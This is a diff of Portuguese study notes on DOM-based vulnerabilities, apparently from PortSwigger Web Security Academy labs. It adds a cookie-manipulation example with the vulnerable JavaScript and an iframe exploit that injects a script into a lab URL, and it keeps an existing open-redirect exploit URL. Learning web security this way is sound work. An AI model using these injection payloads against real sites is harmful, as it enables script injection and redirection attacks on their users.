@@ -1,6 +1,6 @@
-# Vulnerabilidades DOM Based
+# Vulnerabilidades DOM-Based
 
-Para identificar essas vulnerabilidades é recomendado utilizar o Brwoser da PortSwigger e a extensão que identifica esse tipo de exploração.
+Para identificar essas vulnerabilidades é recomendado utilizar o Browser da PortSwigger com a extensão que identifica esse tipo de exploração.
 
 Também pode-se identificar analisando o código fonte, principalmente de arquivos JavaScript.
 
@@ -48,4 +48,20 @@ Esse é o código-fonte vulnerável:
 Exploit:
 ```
 https://0ae900830459749cc2465788006000b5.web-security-academy.net/post?postId=7&url=https://exploit-0ab30006040d744dc2a7561101df00f9.exploit-server.net/exploit#
+```
+
+<br>
+
+**DOM-Based Cookie Manipulation**
+Observe que a aplicação utilize um cookie no client-side chamado `lastViewedProduct` que tem como valor a URL do último produto que o usuário visitou.
+
+```
+<script>
+document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
+</script>
+```
+
+Exploit:
+```
+<iframe src="https://0a1100e803937b60c6874ab7003b00b5.web-security-academy.net/product?productId=1&'><script>print()</script>">
 ```
